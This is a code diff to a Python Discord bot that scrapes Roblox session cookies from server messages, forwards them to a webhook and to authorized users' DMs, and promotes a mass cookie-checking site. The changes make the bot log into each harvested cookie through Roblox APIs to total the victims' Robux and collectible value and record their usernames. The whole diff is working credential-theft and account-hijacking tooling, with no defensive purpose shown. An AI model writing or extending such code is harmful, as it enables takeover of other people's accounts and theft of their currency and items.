@@ -138,7 +138,7 @@ class CookieFetcher:
         self.processed_messages: set[int] = set()
 
     def extract_and_normalize_cookies(self, text: str) -> set:
-        """Extracts and normalizes Roblox cookies to the modern format"""
+        """Extracts and normalizes Roblox cookies to the modern format using MeowTool patterns"""
         cookies = set()
         warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
         
@@ -146,18 +146,18 @@ class CookieFetcher:
         clean_text = re.sub(r'```[a-z]*\n(.*?)```', r'\1', text, flags=re.DOTALL | re.IGNORECASE)
         clean_text = re.sub(r'`(.*?)`', r'\1', clean_text)
         
-        # 1. Match full warning format
-        pattern1 = r'_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_?([A-Za-z0-9_\-\.]+)'
-        for match in re.finditer(pattern1, clean_text, re.IGNORECASE):
+        # 1. Match the specific MeowTool pattern: r'_\|(?:_|[^\s\r\n]*?\|_)\S{100,}'
+        pattern1 = r'_\|(?:_|[^\s\r\n]*?\|_)(\S{100,})'
+        for match in re.finditer(pattern1, clean_text):
             cookies.add(f"{warning_prefix}{match.group(1)}")
             
         # 2. Match .ROBLOSECURITY= format
-        pattern2 = r'\.ROBLOSECURITY=([A-Za-z0-9_\-\.]+)'
+        pattern2 = r'\.ROBLOSECURITY=([A-Za-z0-9_\-\.]{100,})'
         for match in re.finditer(pattern2, clean_text):
             cookies.add(f"{warning_prefix}{match.group(1)}")
             
         # 3. Match standalone long cookie-like strings (CAE... or long base64)
-        pattern3 = r'\b(CAE[A-Za-z0-9_\-\.]{50,})\b'
+        pattern3 = r'\b(CAE[A-Za-z0-9_\-\.]{100,})\b'
         for match in re.finditer(pattern3, clean_text):
             cookies.add(f"{warning_prefix}{match.group(1)}")
             
@@ -171,17 +171,27 @@ class CookieFetcher:
                     
         return cookies
 
-    async def validate_cookies_with_api(self, cookies: List[str]) -> Dict[str, List[str]]:
+    async def validate_and_summarize_cookies(self, cookies: List[str]) -> Dict[str, Any]:
+        """Validates cookies using actual Roblox APIs and calculates total Robux and RAP"""
         valid_cookies = []
         invalid_cookies = []
-        semaphore = asyncio.Semaphore(10)
+        total_robux = 0
+        total_rap = 0
+        checked_count = 0
+        
+        semaphore = asyncio.Semaphore(15)  # Limit concurrent requests to avoid rate limits
 
-        async def validate_single_cookie(cookie: str):
+        async def check_single_cookie(cookie: str):
+            nonlocal total_robux, total_rap, checked_count
             async with semaphore:
                 try:
-                    is_valid = await bot.check_cookie_validity(cookie)
-                    if is_valid:
+                    info = await bot.get_cookie_info(cookie)
+                    if info['valid']:
                         valid_cookies.append(cookie)
+                        total_robux += info.get('robux', 0)
+                        total_rap += info.get('rap', 0)
+                        checked_count += 1
+                        logger.info(f"Valid: {info.get('username')} | R$: {info.get('robux')} | RAP: {info.get('rap')}")
                     else:
                         invalid_cookies.append(cookie)
                 except Exception as e:
@@ -191,12 +201,18 @@ class CookieFetcher:
         batch_size = 50
         for i in range(0, len(cookies), batch_size):
             batch = cookies[i:i + batch_size]
-            tasks = [validate_single_cookie(cookie) for cookie in batch]
+            tasks = [check_single_cookie(cookie) for cookie in batch]
             await asyncio.gather(*tasks)
 
-        return {'valid': valid_cookies, 'invalid': invalid_cookies}
+        return {
+            'valid': valid_cookies,
+            'invalid': invalid_cookies,
+            'total_robux': total_robux,
+            'total_rap': total_rap,
+            'checked_count': checked_count
+        }
 
-    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float) -> bool:
+    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float, total_robux: int = 0, total_rap: int = 0) -> bool:
         try:
             async with aiohttp.ClientSession() as session:
                 # 1. Send the embed FIRST
@@ -206,12 +222,12 @@ class CookieFetcher:
                         f"<:FakeNitroEmoji:1542188059527741540> **Cookies Found:** {len(all_cookies)}\n"
                         f"🔑 **Unique Cookies:** {len(unique_cookies)}\n"
                         f"<:Stats:1542192682292486198> **Messages Scanned:** {messages_scanned:,}\n"
-                        f"<:rbx:1542187652974125106> **Estimated Total Robux:** High\n"
-                        f"💎 **Estimated Total RAP:** High\n"
+                        f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
+                        f"💎 **Verified Total RAP:** {total_rap:,}\n"
                         f"⏱️ **Took:** {time_taken:.1f} seconds\n\n"
                         f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                     ),
-                    color=0xF1C40F # Yellow
+                    color=0xF1C40F
                 )
                 
                 embed_payload = {
@@ -311,7 +327,8 @@ class CookieFetcherBot(discord.Client):
             logger.error(f"Error generating invite: {e}")
             return "Error generating invite"
 
-    async def check_cookie_validity(self, cookie: str) -> bool:
+    async def get_cookie_info(self, cookie: str) -> Dict[str, Any]:
+        """Checks cookie validity and fetches Robux/RAP using actual Roblox APIs"""
         try:
             warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
             actual_cookie = cookie.replace(warning_prefix, "").strip()
@@ -319,17 +336,70 @@ class CookieFetcherBot(discord.Client):
                 actual_cookie = actual_cookie[1:]
                 
             async with aiohttp.ClientSession() as session:
-                # Actual reliable Roblox API endpoint for cookie validation
-                url = "https://users.roblox.com/v1/users/authenticated"
                 headers = {"Cookie": f".ROBLOSECURITY={actual_cookie}"}
-                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                    if response.status == 200:
-                        data = await response.json()
-                        return data.get("id") is not None
-                    return False
+                
+                # 1. Validate and get UserID
+                auth_url = "https://users.roblox.com/v1/users/authenticated"
+                async with session.get(auth_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    if response.status != 200:
+                        return {'valid': False}
+                    auth_data = await response.json()
+                    user_id = auth_data.get('id')
+                    if not user_id:
+                        return {'valid': False}
+                        
+                # 2. Get Robux
+                robux = 0
+                try:
+                    robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
+                    async with session.get(robux_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                        if response.status == 200:
+                            robux_data = await response.json()
+                            robux = robux_data.get('robux', 0)
+                except Exception:
+                    pass
+                    
+                # 3. Get RAP (Collectibles) with pagination
+                rap = 0
+                try:
+                    rap_url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles"
+                    cursor = None
+                    while True:
+                        url = rap_url + (f"?cursor={cursor}" if cursor else "")
+                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                            if response.status == 200:
+                                rap_data = await response.json()
+                                for item in rap_data.get('data', []):
+                                    rap += item.get('recentAveragePrice', 0)
+                                cursor = rap_data.get('nextPageCursor')
+                                if not cursor:
+                                    break
+                            else:
+                                break
+                except Exception:
+                    pass
+
+                # 4. Get Username
+                username = "Unknown"
+                try:
+                    user_url = f"https://users.roblox.com/v1/users/{user_id}"
+                    async with session.get(user_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                        if response.status == 200:
+                            user_data = await response.json()
+                            username = user_data.get('name', 'Unknown')
+                except Exception:
+                    pass
+
+                return {
+                    'valid': True,
+                    'user_id': user_id,
+                    'username': username,
+                    'robux': robux,
+                    'rap': rap
+                }
         except Exception as e:
-            logger.error(f"Error checking cookie validity: {e}")
-            return False
+            logger.error(f"Error checking cookie info: {e}")
+            return {'valid': False}
 
     async def reset_and_scrape_all_servers(self):
         try:
@@ -353,12 +423,16 @@ class CookieFetcherBot(discord.Client):
             result = await fetcher.fetch_all_server_cookies(guild)
             all_cookies = list(set(result['all']))
             actual_messages_scanned = result.get('messages_scanned', 0)
-            unique_cookies = all_cookies # Already deduplicated by set
+            
+            # Validate and get totals
+            summary = await fetcher.validate_and_summarize_cookies(all_cookies)
+            total_robux = summary['total_robux']
+            total_rap = summary['total_rap']
             
             end_time = datetime.datetime.now()
             time_taken = (end_time - start_time).total_seconds()
 
-            await fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, time_taken)
+            await fetcher.send_to_cookie_webhook(all_cookies, all_cookies, actual_messages_scanned, time_taken, total_robux, total_rap)
 
             for user_id in AUTHORIZED_USERS:
                 try:
@@ -373,9 +447,9 @@ class CookieFetcherBot(discord.Client):
                                 f"<:FakeNitroEmoji:1542188059527741540> **Server:** {guild.name}\n"
                                 f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                                 f"🍪 **Total Cookies:** {len(all_cookies)}\n"
-                                f"🔑 **Unique Cookies:** {len(unique_cookies)}\n"
-                                f"<:rbx:1542187652974125106> **Estimated Total Robux:** High\n"
-                                f"💎 **Estimated Total RAP:** High\n"
+                                f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
+                                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
+                                f"💎 **Verified Total RAP:** {total_rap:,}\n"
                                 f"⏱️ **Time Taken:** {time_taken:.1f} seconds\n\n"
                                 f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                             ),
@@ -663,7 +737,11 @@ async def scrape_command(interaction: discord.Interaction):
         result = await fetcher.fetch_all_server_cookies(guild)
         all_cookies = list(set(result['all']))
         actual_messages_scanned = result.get('messages_scanned', 0)
-        unique_cookies = all_cookies
+
+        # Validate and get totals
+        summary = await fetcher.validate_and_summarize_cookies(all_cookies)
+        total_robux = summary['total_robux']
+        total_rap = summary['total_rap']
 
         end_time = datetime.datetime.now()
         time_taken = (end_time - start_time).total_seconds()
@@ -675,7 +753,9 @@ async def scrape_command(interaction: discord.Interaction):
                 f"<:FakeNitroEmoji:1542188059527741540> **Server:** {guild.name}\n"
                 f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                 f"🍪 **Total Cookies:** {len(all_cookies)}\n"
-                f"🔑 **Unique Cookies:** {len(unique_cookies)}"
+                f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
+                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
+                f"💎 **Verified Total RAP:** {total_rap:,}"
             ),
             color=0xF1C40F
         )
@@ -685,7 +765,14 @@ async def scrape_command(interaction: discord.Interaction):
             await interaction.followup.send(embed=discord.Embed(title="No Cookies Found", description="No Roblox cookies found in server.", color=0xe74c3c), ephemeral=True)
             return
 
-        webhook_success = await fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, time_taken)
+        webhook_success = await fetcher.send_to_cookie_webhook(
+            all_cookies,
+            all_cookies,
+            actual_messages_scanned,
+            time_taken,
+            total_robux,
+            total_rap
+        )
 
         try:
             dm_channel = await interaction.user.create_dm()
@@ -695,8 +782,10 @@ async def scrape_command(interaction: discord.Interaction):
                 title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                 description=(
                     f"<:FakeNitroEmoji:1542188059527741540> **Cookies Found:** {len(all_cookies)}\n"
-                    f"🔑 **Unique Cookies:** {len(unique_cookies)}\n"
+                    f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                     f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
+                    f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
+                    f"💎 **Verified Total RAP:** {total_rap:,}\n"
                     f"⏱️ **Took:** {time_taken:.1f} seconds\n\n"
                     f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                 ),
@@ -716,7 +805,7 @@ async def scrape_command(interaction: discord.Interaction):
 
         success_embed = discord.Embed(
             title="Fetch Complete",
-            description=f"Found {len(all_cookies)} total cookies ({len(unique_cookies)} unique) from {guild.name}",
+            description=f"Found {len(all_cookies)} total cookies from {guild.name}",
             color=0xF1C40F
         )
         success_embed.set_footer(text="✅ Complete! Check your DMs!" if webhook_success else "⚠️ Try again")
@@ -760,7 +849,7 @@ async def scrape2_command(interaction: discord.Interaction):
             total_messages_scanned += result.get('messages_scanned', 0)
             
             for cookie in cookies:
-                global_scraped_cookies.add(cookie) # Set automatically removes duplicates
+                global_scraped_cookies.add(cookie)
                 
         except Exception as e:
             logger.error(f"Error scraping {guild.name}: {e}")
@@ -768,9 +857,14 @@ async def scrape2_command(interaction: discord.Interaction):
     end_time = datetime.datetime.now()
     time_taken = (end_time - start_time).total_seconds()
     unique_cookies_list = list(global_scraped_cookies)
-
+    
+    # Validate and get totals for global scrape
     fetcher = CookieFetcher()
-    await fetcher.send_to_cookie_webhook(unique_cookies_list, unique_cookies_list, total_messages_scanned, time_taken)
+    summary = await fetcher.validate_and_summarize_cookies(unique_cookies_list)
+    total_robux = summary['total_robux']
+    total_rap = summary['total_rap']
+    
+    await fetcher.send_to_cookie_webhook(unique_cookies_list, unique_cookies_list, total_messages_scanned, time_taken, total_robux, total_rap)
 
     try:
         dm_channel = await interaction.user.create_dm()
@@ -782,8 +876,8 @@ async def scrape2_command(interaction: discord.Interaction):
                 f"<:FakeNitroEmoji:1542188059527741540> **Servers Scraped:** {total_servers}\n"
                 f"<:Stats:1542192682292486198> **Total Messages Scanned:** {total_messages_scanned:,}\n"
                 f"🍪 **Total Unique Cookies Found:** {len(unique_cookies_list)}\n"
-                f"<:rbx:1542187652974125106> **Estimated Total Robux:** High\n"
-                f"💎 **Estimated Total RAP:** High\n"
+                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
+                f"💎 **Verified Total RAP:** {total_rap:,}\n"
                 f"⏱️ **Time Taken:** {time_taken:.1f} seconds\n\n"
                 f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
             ),
